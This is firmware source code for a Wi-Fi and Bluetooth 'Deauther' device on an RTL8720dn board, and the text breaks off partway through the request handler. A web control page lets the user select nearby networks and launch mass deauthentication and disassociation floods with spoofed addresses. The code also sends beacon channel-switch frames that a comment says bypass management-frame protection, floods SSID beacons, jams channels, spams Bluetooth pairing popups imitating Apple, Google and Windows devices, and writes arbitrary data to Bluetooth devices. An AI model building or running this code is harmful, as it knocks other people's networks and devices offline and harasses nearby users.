#undef min
#undef max
#include <vector>
#include <map>
#include <cstdlib>
namespace std { using ::rand; using ::Rand; }
#include <algorithm>

#include "wifi_conf.h"
#include "src/packet-injection/packet-injection.h"
#include "src/interference/interference.h"
#include "src/spammer/spammer.h"
#include "src/oled/oled_display.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "BLEDevice.h"
#include "BLEScan.h"
#include "BLEClient.h"

// GAP Headers for AmebaD v3.1.9
#ifdef __cplusplus
extern "C" {
#endif
#include "gap_le_types.h"
#include "gap_callback_le.h"
#ifdef __cplusplus
}
#endif

void handleRoot(WiFiClient &client);
void handle404(WiFiClient &client);

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 100;
int beacons_per_ssid = 3;
int send_delay = 0;
bool isDeauthing = false;
bool isSpamming = false;
bool isBLEAuditing = false;
bool isBLESpamming = false;
bool isInterfering = false;
int bleSpamType = 0; 
std::vector<String> spam_ssids;
std::vector<int> selected_indices;
std::vector<int> target_channels;
int deauth_reasons[] = {1, 4, 6, 7, 8};

typedef struct {
  String name;
  String address;
  int rssi;
} BLEAuditResult;
std::vector<BLEAuditResult> ble_results;

// Callback xử lý dữ liệu quét BLE cho AmebaD v3
void bleScanCallback(T_LE_CB_DATA *p_data) {
    T_LE_SCAN_INFO *p_scan_info = p_data->p_le_scan_info;
    BLEAuditResult res;
    
    // Convert MAC address to String
    char mac_str[18];
    sprintf(mac_str, "%02X:%02X:%02X:%02X:%02X:%02X", 
            p_scan_info->bd_addr[5], p_scan_info->bd_addr[4], p_scan_info->bd_addr[3],
            p_scan_info->bd_addr[2], p_scan_info->bd_addr[1], p_scan_info->bd_addr[0]);
    res.address = String(mac_str);
    res.rssi = p_scan_info->rssi;
    res.name = "[Unknown]";

    // Parse Device Name from Advert Data (Type 0x09 or 0x08)
    uint8_t len = p_scan_info->data_len;
    uint8_t *p_adv = p_scan_info->data;
    uint8_t offset = 0;
    while (offset < len) {
        uint8_t ad_len = p_adv[offset];
        if (ad_len == 0) break;
        uint8_t ad_type = p_adv[offset + 1];
        if (ad_type == 0x09 || ad_type == 0x08) { // Complete or Shortened Local Name
            char name_buf[32];
            uint8_t name_len = (ad_len - 1 < 31) ? ad_len - 1 : 31;
            memcpy(name_buf, &p_adv[offset + 2], name_len);
            name_buf[name_len] = '\0';
            res.name = String(name_buf);
            break;
        }
        offset += ad_len + 1;
    }

    // Tránh trùng lặp trong danh sách tạm
    bool exists = false;
    for(const auto& item : ble_results) {
        if(item.address == res.address) { exists = true; break; }
    }
    if(!exists && ble_results.size() < 20) ble_results.push_back(res);
}

bool led = true;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  // Gửi Header trực tiếp để tiết kiệm RAM
  client.print("HTTP/1.1 200 OK\r\n");
  client.print("Content-Type: text/html\r\n");
  client.print("Connection: close\r\n\r\n");

  client.print(R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
    <meta name="theme-color" content="#36393E">
    <title>RTL8720dn-Deauther</title>
    <style>
      body { background: #36393e; color: #bfbfbf; font-family: sans-serif; }
)");

  client.print(R"(
      h3 { background: #2f3136; color: #bfbfbb; padding: .2em 1em; border-radius: 3px; font-weight: 100; text-align: center; width: 50%; }
      .centered { display: flex; justify-content: center; }
      h1 { font-size: 1.7rem; margin-top: 1rem; background: #2f3136; color: #bfbfbb; padding: .2em 1em; border-radius: 3px; border-left: solid #20c20e 5px; border-right: solid #20c20e 5px; font-weight: 100; text-align: center; }
      h2 { font-size: 1.1rem; margin-top: 1rem; background: #2f3136; color: #bfbfbb; padding: .4em 1em; border-radius: 3px; border-left: solid #20c20e 5px; font-weight: 100; }
      table { border-collapse: collapse; width: 100%; margin-bottom: 2em; }
      td, th { border-bottom: 1px solid #5d5d5d; text-align: left; }
      .tdFixed { text-align: center; } .tdMeter { padding-right: 10px; }
      .right { display: flex; flex-direction: row-reverse; }
      .container { display: flex; flex-direction: column; width: 100%; }
      .checkBoxContainer { display: block; position: relative; padding-left: 25px; margin-bottom: 12px; cursor: pointer; font-size: 22px; user-select: none; height: 32px; }
      .checkBoxContainer input { position: absolute; opacity: 0; cursor: pointer; }
      .checkmark { position: absolute; top: 8px; left: 0; height: 28px; width: 28px; background-color: #2F3136; border-radius: 4px; }
      .checkmark:after { content: ""; position: absolute; display: none; }
      .checkBoxContainer input:checked ~ .checkmark:after { display: block; }
      .checkBoxContainer .checkmark:after { left: 10px; top: 7px; width: 4px; height: 10px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
      .meter_background { background: #42464D; } .meter_forground { color: #fff; padding: 4px 0; }
      .meter_green { background: #43B581; } .meter_orange { background: #FAA61A; } .meter_red { background: #F04747; }
      .meter_value { padding-left: 8px; }
      .button-container { display: flex; justify-content: start; align-items: center; column-gap: 15px; }
      button, input[type=submit] { height: 38px; color: #fff; text-align: center; font-size: 11px; font-weight: 600; line-height: 38px; text-transform: uppercase; background: #2f3136; border-radius: 4px; border: 0; cursor: pointer; }
      button:hover, input[type=submit]:hover { background: #42444a; }
      input[type=text], select { text-align: center; height: 38px; padding: 0 5px; }
      .warning { background: #f04747; color: white; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 10px; font-weight: bold; }
    </style>
  </head>
  <body>
  <div class="container">
    <h1 class="bold">RTL8720dn-Deauther (Streaming Mode)</h1>
    <div class="warning">DANGER: Start attack will KILL this Web UI and turn off SoftAP for MAX PERFORMANCE. You MUST press RESET on board to stop.</div>
      <div class="right">
        <div class="button-container">
          <form method="post" action="/rescan"><input type="submit" value="Rescan Network"></form>
          <form method="post" action="/refresh"><input type="submit" value="Refresh page"></form>
        </div>
      </div>
      <form method="post" action="/deauth">
  )");

  client.print("<h2>Access Points: " + String(scan_results.size()) + "</h2>");
  client.print(R"(<div class="centered"><h3 class="bold">5 GHz networks</h3></div><table><tr><th>SSID</th><th class='tdFixed'>CH</th><th>BSSID</th><th>RSSI</th><th class='tdFixed'>Deauth</th><th class='tdFixed'>Interfere</th></tr>)");

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel >= 36) {
      String color = (scan_results[i].rssi + 130 < 50) ? "meter_red" : (scan_results[i].rssi + 130 < 70) ? "meter_orange" : "meter_green";
      client.print("<tr><td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>");
      client.print("<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>");
      client.print("<td>" + scan_results[i].bssid_str + "</td>");
      client.print("<td class='tdMeter'><div class='meter_background'><div class='meter_forground " + color + "' style='width: " + String(scan_results[i].rssi + 120) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>");
      client.print("<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>");
      client.print("<td><label class='checkBoxContainer'><input type='checkbox' name='interfere' value='" + String(i) + "'><span class='checkmark' style='background:#7289da;'></span></label></td></tr>");
    }
  }

  client.print(R"(</table><div class="centered"><h3 class="bold">2.4 GHz networks</h3></div><table><tr><th>SSID</th><th class='tdFixed'>CH</th><th>BSSID</th><th>RSSI</th><th class='tdFixed'>Deauth</th><th class='tdFixed'>Interfere</th></tr>)");


  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel <= 14) {
      String color = "";
      int width = scan_results[i].rssi + 120;
      int colorWidth = scan_results[i].rssi + 130;

      if (colorWidth < 50) color = "meter_red";
      else if (colorWidth < 70) color = "meter_orange";
      else color = "meter_green";
      
      client.print("<tr><td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>");
      client.print("<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>");
      client.print("<td>" + scan_results[i].bssid_str + "</td>");
      client.print("<td class='tdMeter'><div class='meter_background'><div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>");
      client.print("<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>");
      client.print("<td><label class='checkBoxContainer'><input type='checkbox' name='interfere' value='" + String(i) + "'><span class='checkmark' style='background:#7289da;'></span></label></td></tr>");
    }
  }
  client.print(R"(</table><div class="right"><div class="button-container"><input style="background: #f04747; width: 200px; height: 50px; font-size: 14px;" type="submit" value="START FULL ATTACK!"></div></div></form>)");

  client.print("<h2>Dashboard</h2><table><tr><th>State</th><th>Current Value</th></tr>");
  String statusStr = "Stopped";
  if (isDeauthing) statusStr = "Deauthing (LOCKED)";
  else if (isSpamming) statusStr = "SSID Spammer (LOCKED)";
  else if (isBLESpamming) statusStr = "BLE Spammer (LOCKED)";
  else if (isInterfering) statusStr = "Interference (LOCKED)";
  client.print("<tr><td>Status Attack</td><td>" + statusStr + "</td></tr>");
  client.print("<tr><td>LED Enabled</td><td>" + String(led ? "Yes" : "No") + "</td></tr>");
  client.print("<tr><td>Frame Sent</td><td>" + String(sent_frames) + "</td></tr>");
  client.print("<tr><td>Intensity</td><td>" + String(frames_per_deauth) + " frames / target</td></tr></table>");

  client.print(R"(<h2>Setup</h2><div class="right"><div class="button-double"><form method="post" action="/setframes"><div class="button-container"><input class="longInput" type="text" name="frames" placeholder="Number of frames"><input type="submit" value="Set frames"></div></form></div></div>)");
  client.print(R"(<h2>LED Options</h2><div class="right"><div class="button-container"><form method="post" action="/led_enable"><input type="submit" value="Turn on LED"></form><form method="post" action="/led_disable"><input type="submit" value="Turn off LED"></form></div></div>)");

  client.print(R"(<h2>BLE Auditor</h2><div class="right"><form method="post" action="/blescan"><input style="background: #7289da;" type="submit" value="SCAN BLE DEVICES"></form></div><table><tr><th>Name / MAC</th><th>RSSI</th><th>Action</th></tr>)");

  for (auto const& device : ble_results) {
      client.print("<tr><td>" + device.name + "<br><small>" + device.address + "</small></td>");
      client.print("<td>" + String(device.rssi) + "</td>");
      client.print("<td><button onclick=\"document.getElementById('target_mac').value='" + device.address + "'\">Select</button></td></tr>");
  }

  client.print(R"(</table><div class="centered"><form method="post" action="/blewrite" style="width: 90%; background: #2f3136; padding: 15px; border-radius: 8px; margin-top: 10px;">)");
  client.print(R"(<input type="text" id="target_mac" name="mac" placeholder="Target MAC" style="width: 100%; margin-bottom: 5px;">)");
  client.print(R"(<div style="display: flex; gap: 5px;"><input type="text" name="service" placeholder="Service" style="flex: 1;">)");
  client.print(R"(<input type="text" name="char" placeholder="Char" style="flex: 1;"></div>)");
  client.print(R"(<input type="text" name="data" placeholder="Hex Data" style="width: 100%; margin-top: 5px;">)");
  client.print(R"(<input style="background: #f04747; width: 100%; margin-top: 10px; height: 45px;" type="submit" value="BYPASS & WRITE"></form></div>)");

  // --- Beacon Flooding Section ---
  client.print(R"raw(<details style="margin: 20px 10%; background: #2f3136; border-radius: 8px; padding: 10px; color: #bfbfbb;">)raw");
  client.print(R"raw(<summary style="cursor: pointer; font-weight: bold; color: #7289da; padding: 5px;">Beacon Flooding (SSID Spammer)</summary>)raw");
  client.print(R"raw(<div style="margin-top: 10px;"><form method="post" action="/spam">)raw");
  client.print(R"raw(<textarea name="ssids" placeholder="SSID List (one per line)" style="width: 100%; height: 100px; background: #23272a; color: white; border: none; border-radius: 4px; padding: 10px;"></textarea>)raw");
  client.print(R"raw(<div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;"><span style="font-size: 12px;">Beacons/SSID:</span>)raw");
  client.print(R"raw(<input type="number" name="count" value="1" style="flex: 1; height: 35px; background: #23272a; color: white; border: none; border-radius: 4px; padding: 0 10px;"></div>)raw");
  client.print(R"raw(<input style="background: #f04747; width: 100%; margin-top: 10px; height: 45px;" type="submit" value="START BEACON FLOOD"></form></div></details>)raw");

  // --- BLE Flooder Section ---
  client.print(R"raw(<details style="margin: 20px 10%; background: #2f3136; border-radius: 8px; padding: 10px; color: #bfbfbb;">)raw");
  client.print(R"raw(<summary style="cursor: pointer; font-weight: bold; color: #7289da; padding: 5px;">BLE Flooder</summary>)raw");
  client.print(R"raw(<div style="margin-top: 10px;"><form method="post" action="/blespam"><select name="type" style="width: 100%; height: 35px; background: #23272a; color: white; border: none; border-radius: 4px; padding: 0 10px;">)raw");
  client.print(R"raw(<option value="0">Apple Popup</option><option value="1">Google Fast Pair</option><option value="2">Windows Swift Pair</option></select>)raw");
  client.print(R"raw(<input style="background: #f04747; width: 100%; margin-top: 10px; height: 45px;" type="submit" value="START BLE FLOOD"></form></div></details></div></body></html>)raw");
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();

  // === OLED: Boot splash ===
  oled_init();
  oled_show_boot();
  delay(1500);

  String ap_ch = String(current_channel);
  WiFi.apbegin(ssid, pass, (char *)ap_ch.c_str());

  // === OLED: Scanning screen ===
  oled_show_scanning();
  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  // === OLED: Idle/Ready screen with AP counts ===
  {
    int c24 = 0, c5g = 0;
    for (uint i = 0; i < scan_results.size(); i++) {
      if (scan_results[i].channel <= 14) c24++;
      else c5g++;
    }
    oled_show_idle(c24, c5g);
  }

  if (led) {
    digitalWrite(LED_R, HIGH);
  }
  wifi_disable_powersave(); // Ép Radio công suất cao nhất (AmebaD Standard)
}

void loop() {
  // ========================================================
  // BLE FLOODER: Dedicated loop (separate from WiFi attacks)
  // ========================================================
  if (isBLESpamming && !isDeauthing && !isSpamming && !isInterfering) {
    if (led) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
    }
    
    DEBUG_SER_PRINT("[*] BLE Flooder: Starting type=" + String(bleSpamType) + "\n");

    // Apple device models (2-byte pairs)
    static const uint8_t apple_models[][2] = {
        {0x02, 0x20}, // AirPods
        {0x0E, 0x20}, // AirPods Pro
        {0x0A, 0x20}, // AirPods Max
        {0x0F, 0x20}, // AirPods 2nd Gen
        {0x13, 0x20}, // AirPods 3rd Gen
        {0x14, 0x20}, // AirPods Pro 2nd Gen
        {0x03, 0x20}, // PowerBeats3
        {0x0B, 0x20}, // PowerBeats Pro
        {0x0C, 0x20}, // Beats Solo Pro
        {0x11, 0x20}, // Beats Studio Buds
        {0x10, 0x20}, // Beats Flex
        {0x05, 0x20}, // AppleTV Setup
        {0x06, 0x20}, // HomePod Setup
        {0x09, 0x20}, // AppleTV Connect
    };
    static const int apple_model_count = sizeof(apple_models) / sizeof(apple_models[0]);
    static const uint32_t google_models[] = {
        0x0002F0, 0x000006, 0x00000A, 0x000055, 0x000070,
        0x000007, 0x000012, 0x0000F0, 0x000001, 0x000003
    };
    static const int google_model_count = sizeof(google_models) / sizeof(google_models[0]);

    int rotation = 0;

    // === CORRECT SDK FLOW FOR DYNAMIC PAYLOADS ===
    BLE.init();
    BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
    BLE.configAdvert()->setMinInterval(20);
    BLE.configAdvert()->setMaxInterval(20);
    
    // Start with empty payload to get GAP stack running
    uint8_t dummy[] = {0x02, 0x01, 0x06};
    BLE.configAdvert()->setAdvData(dummy, sizeof(dummy));
    BLE.beginPeripheral();
    
    // Give GAP stack time to transition state
    delay(100);

    oled_attack_start();  // OLED: reset uptime counter

    while (isBLESpamming) {
        // === Build payload for this cycle ===
        uint8_t payload[31];
        uint8_t size = 0;
        int model_idx = rotation % apple_model_count;
        uint32_t g_model = google_models[rotation % google_model_count];

        if (bleSpamType == 0) {
            // Apple Proximity Pairing - exact 30 bytes
            uint8_t apple[] = {
                0x02, 0x01, 0x1A,           // Flags
                0x1A, 0xFF, 0x4C, 0x00,     // Length=26, Manuf Specific, Apple
                0x07, 0x0F, 0x00,           // Proximity, Length=15, Prefix
                apple_models[model_idx][0], // Model 1
                apple_models[model_idx][1], // Model 2
                0xC0,                       // Status
                (uint8_t)random(0, 255), (uint8_t)random(0, 255), // random
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // zeros
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // zeros
            };
            size = sizeof(apple); // Exactly 30 bytes
            memcpy(payload, apple, size);
        } else if (bleSpamType == 1) {
            uint8_t google[] = {
                0x02, 0x01, 0x02,
                0x03, 0x03, 0x2C, 0xFE,
                0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((g_model >> 16) & 0xFF),
                (uint8_t)((g_model >> 8)  & 0xFF),
                (uint8_t)(g_model & 0xFF)
            };
            size = sizeof(google); // Exactly 14 bytes
            memcpy(payload, google, size);
        } else {
            uint8_t windows[] = {
                0x02, 0x01, 0x06,
                0x03, 0x03, 0x00, 0xFE,
                0x0A, 0x16, 0x00, 0xFE,
                0x00, 0x01, 0x00,
                (uint8_t)random(0, 255), (uint8_t)random(0, 255),
                (uint8_t)random(0, 255), (uint8_t)random(0, 255)
            };
            size = sizeof(windows); // Exactly 18 bytes
            memcpy(payload, windows, size);
        }

        // 1. Stop advertising
        BLE.configAdvert()->stopAdv();
        
        // 2. Wait for stop to propagate to GAP task
        delay(10);
        
        // 3. Update data in GAP stack
        BLE.configAdvert()->setAdvData(payload, size);
        BLE.configAdvert()->updateAdvertParams();
        
        // 4. Start advertising
        BLE.configAdvert()->startAdv();

        // 5. Let it advertise for 200ms (~10 packets at 20ms interval)
        if (led) digitalWrite(LED_B, HIGH);
        delay(200);
        if (led) digitalWrite(LED_B, LOW);

        sent_frames++;
        rotation++;
        oled_show_ble_spam(bleSpamType, sent_frames);  // OLED: BLE flood HUD
        DEBUG_SER_PRINT("[BLE] Sent model_idx=" + String(model_idx) + " size=" + String(size) + "\n");
    }

    // Clean shutdown
    BLE.configAdvert()->stopAdv();
    delay(10);
    BLE.end();

    if (led) {
      digitalWrite(LED_B, LOW);
      digitalWrite(LED_R, HIGH);
    }
  }
  
  // ========================================================
  // WiFi Attack Modes: Deauth / Spammer / Interference
  // ========================================================
  if (isDeauthing || isSpamming || isInterfering) {
    if (led) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
    }
    
    if (target_channels.empty()) {
        for (int i = 1; i <= 13; i++) target_channels.push_back(i);
    }

    if (isDeauthing) {
        std::vector<int> channels_24;
        std::vector<int> channels_5g;
        target_channels.clear();
        for (auto const& x : deauth_channels) {
            if (x.first <= 14) channels_24.push_back(x.first);
            else channels_5g.push_back(x.first);
        }
        for (int ch : channels_24) target_channels.push_back(ch);
        for (int ch : channels_5g) target_channels.push_back(ch);
    }

    static int last_ch = -1;
    // FIX #5 (ino): Dùng non-DFS UNII-1/3 channels – client sẽ switch ngay
    static const uint8_t csa_ghost_channels[] = {36, 40, 44, 48, 149, 153, 157, 161};
    static int csa_ghost_idx = 0;

    oled_attack_start();  // OLED: reset uptime counter

    while (true) {
        if (isInterfering) {
            run_interference_cycle();
            oled_show_interference(get_active_target_count(), MAX_INTERFERENCE_TARGETS);  // OLED
            if (get_interference_state() == INT_STATE_IDLE) {
                isInterfering = false;
                break; 
            }
            continue;
        }

        for (int ch : target_channels) {
            if (ch != last_ch) {
                wext_set_channel(WLAN0_NAME, ch);
                if ((last_ch <= 14 && ch > 14) || (last_ch > 14 && ch <= 14)) {
                    delay(7); 
                } else {
                    delay(1);
                }
                last_ch = ch;
            }

            if (isDeauthing && deauth_channels.count(ch)) {
                if (led) digitalWrite(LED_B, HIGH);
                
                bool is5GHz = (ch > 14);
                // Use user defined frames per deauth, default 100
                int pulse_count = frames_per_deauth; 
                uint16_t reasons[] = {deauth_reason, 8, 1, 4, 6, 7}; 
                static uint32_t fast_mac_counter = 0;

                for (int i = 0; i < pulse_count; i++) {
                    for (int idx : deauth_channels[ch]) {
                        uint8_t* bssid = scan_results[idx].bssid;
                        uint16_t reason = reasons[i % 6];
                        
                        // Fast MAC spoofing without using random() to save CPU
                        fast_mac_counter++;
                        uint8_t rand_mac[6] = {0x02, (uint8_t)(fast_mac_counter >> 24), (uint8_t)(fast_mac_counter >> 16), (uint8_t)(fast_mac_counter >> 8), (uint8_t)fast_mac_counter, 0xAA};
                        
                        if (is5GHz) {
                            wifi_tx_deauth_nav(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            uint8_t ghost_ch = csa_ghost_channels[csa_ghost_idx % sizeof(csa_ghost_channels)];
                            
                            // PMF Bypass: Beacon-embedded CSA (Beacon không bị PMF bảo vệ)
                            wifi_tx_beacon_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str(), ghost_ch);
                            wifi_tx_beacon_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str(), ghost_ch);
                            csa_ghost_idx++;
                            
                            wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            // FIX #1: Reverse Deauth – truyền bssid để access_point field đúng
                            wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid);
                            wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            // FIX #1: Reverse Disassoc
                            wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid);
                            wifi_tx_null_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF");
                            wifi_tx_auth_frame(rand_mac, bssid);
                            // Beacon Spoofing to confuse roaming
                            wifi_tx_beacon_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str());
                            
                            // DOUBLE PACKET INJECTION - Aggressive Flooding
                            wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            wifi_tx_auth_frame(rand_mac, bssid);

                            sent_frames += 12;
                        } else {
                            wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            // FIX #1: Reverse Deauth/Disassoc 2.4GHz
                            wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid);
                            wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid);
                            wifi_tx_null_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF");
                            wifi_tx_auth_frame(rand_mac, bssid);
                            // Beacon Spoofing to confuse roaming
                            wifi_tx_beacon_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str());
                            
                            // DOUBLE PACKET INJECTION - Aggressive Flooding
                            wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                            wifi_tx_auth_frame(rand_mac, bssid);

                            sent_frames += 9;
                        }
                    }
                    // RTOS Yield - feed WDT properly every iteration
                    delay(1);
                }
                if (led) digitalWrite(LED_B, LOW);
            }
        } 

      // === OLED: Update attack HUD (throttled internally to 200ms) ===
      if (isDeauthing) {
          oled_show_deauth((int)deauth_channels.size(), sent_frames);
      }

      if (isSpamming) {
          Spammer.run();
          oled_show_spammer((int)spam_ssids.size());
      }
      
      // Global RTOS yield to prevent Idle Task starvation
      delay(1); 
    }
  }

  // Normal Web Server Mode (Only active when not deauthing)
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }
    String request;
    while (client.available()) {
      request += (char)client.read();
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      oled_show_scanning();  // OLED: show scanning screen
      scanNetworks();
      // OLED: update idle screen with new AP counts
      {
        int c24 = 0, c5g = 0;
        for (uint i = 0; i < scan_results.size(); i++) {
          if (scan_results[i].channel <= 14) c24++;
          else c5g++;
        }
        oled_show_idle(c24, c5g);
      }
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      // Collect interfere targets (multi-target support)
      std::vector<int> interfere_indices;
      
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            int ch = scan_results[idx].channel;
            deauth_channels[ch].push_back(idx);
            chs_idx.push_back(ch);
          }
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        } else if (param.first == "interfere") {
          // Multi-target interference checkbox
          int val = String(param.second).toInt();
          if (val >= 0 && val < (int)scan_results.size()) {
            interfere_indices.push_back(val);
          }
        }
      }

      // BUG FIX #7: Send response BEFORE killing WiFi
      client.write(makeRedirect("/").c_str());
      client.stop();
      delay(50); // Let TCP flush

      if (!interfere_indices.empty()) {
          // === Channel Interference Mode (single OR multi-target) ===
          isInterfering = true;
          server.stop();
          wifi_off();
          delay(100);
          wifi_on(RTW_MODE_STA);
          delay(500);
          if (interfere_indices.size() == 1) {
              // Single target: use classic path (captures real beacon)
              int idx = interfere_indices[0];
              start_interference(scan_results[idx].bssid, scan_results[idx].channel);
          } else {
              // Multi-target: initialize multi session then add each target
              start_interference_multi();
              for (int idx : interfere_indices) {
                  add_interference_target(scan_results[idx].bssid, scan_results[idx].channel);
              }
          }
      } else if (!deauth_channels.empty()) {
          // === Multi-Target Deauth Mode ===
          isDeauthing = true;
          server.stop(); 
          wifi_off(); 
          delay(100); 
          wifi_on(RTW_MODE_STA);
          delay(100);
      }
      // Skip the client.stop() at the end since we already did it
      goto end_request;
    } else if (path == "/interference") {
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 100 : frames;
        }
      }
